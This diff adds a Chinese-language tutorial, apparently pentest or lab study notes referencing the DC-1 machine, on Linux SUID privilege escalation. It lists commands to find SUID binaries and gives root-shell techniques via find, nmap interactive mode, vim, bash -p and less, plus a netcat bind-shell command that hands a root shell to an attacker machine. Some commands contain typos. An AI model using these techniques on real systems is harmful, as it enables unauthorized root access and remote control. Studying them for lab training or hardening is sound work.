@@ -1,0 +1,104 @@
+suid是一种特殊的文件权限，能够使得当前用户以执行文件所属用户的权限对该文件进行执行。
+一般来说，没有usid权限的文件只能由该文件所属的用户进行操作，其他用户是没有权限的。
+
+suid提权则是根据suid这个特点，通过运行root用户所拥有的具有suid权限的文件，使得我们在运行suid文件时能够暂时获取到root权限。
+
+能够用于提权的具有suid权限的可执行文件有：find nmap vim bash less more nano cp 
+
+查找“能够用于提权的具有suid权限的文件”的命令:
+find / -perm -u=s -type f 2>/dev/null
+find / -user root -perm -4000-print2>/dev/null
+find / -user root -perm -4000-exec ls -ldp {} \;
+上面不同的命令对应不同的系统，需要一个个尝试。
+
+通过`ls -l 文件名`命令来查看文件的权限和所属用户相关信息
+```
+ls -l usr/bin/find 
+```
+
+
+
+find提权
+首先查找由suid权限的文件
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+选择usr/bin/find
+图15（DC-1）
+
+利用方法示例
+```
+touch test
+find test -exec '/bin/sh' \;
+```
+提权并反弹shell
+很多linux都安装了netcat工具，因此可以将提权后的命令反弹到攻击机：
+```
+find test -exec netcat -lvp 监听端口(5555) -e /bin/sh \;
+```
+然后在攻击机中输入命令接收shell
+```
+netcat 靶机ip 监听端口
+```
+
+
+
+nmap提权
+nmap在2.02-5.21版本时带有交互模式，允许用户执行shell命令，因此可以通过nmap执行root命令。
+1 利用之前需要看一下nmap的版本是否符号要求:
+```
+nmap -v
+```
+2 启动交互模式
+使用参数"interactive"进入交互界面
+```
+nmap --interactive
+```
+3 提权
+在交互页面里输入:
+```
+!sh
+```
+即可执行root命令
+输入`whoami`正常是会输出`root`。
+
+
+vim提权
+vim是文件编辑器，如果有root权限则可以查看所有root文件
+同时也可以被利用来提权
+
+使用vim创建一个文件
+```
+vim test
+```
+在test文件中按esc键，然后直接输入
+```
+:set shell=/bin/sh
+```
+接着输入
+```
+:shell
+```
+即可进入shell界面
+
+
+bash提权
+以下命令将以root权限打开一个bash shell，前提是bash的suid权限是root。
+
+```
+bash -p 
+```
+
+
+less提权
+如果less有root权限的suid，则可以利用进行提权:
+```
+less /etc/passwd
+!/bin/sh
+```
+
+
+
+
+
+usid提权思路基本就是这些，比较好利用，一旦被攻击者没有重视suid的设置，随意给予root权限，那么就很容易被我们利用进行提权。
